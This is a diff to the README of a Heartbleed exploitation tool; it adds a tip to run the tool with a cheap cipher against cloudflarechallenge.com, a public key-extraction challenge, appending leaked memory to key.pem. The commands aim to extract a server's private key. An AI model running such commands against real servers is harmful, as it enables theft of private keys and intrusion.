@@ -38,6 +38,12 @@ Missing required arguments: host
 $ heartbleed -h cloudflarechallenge.com -c 1000 >> key.pem
 ```
 
+Protip, use cheap ciphers:
+
+```bash
+heartbleed -h cloudflarechallenge.com -c 1000 --ciphers="AES128-SHA" >> key.pem
+```
+
 #### LICENSE
 
 This software is licensed under the MIT License.
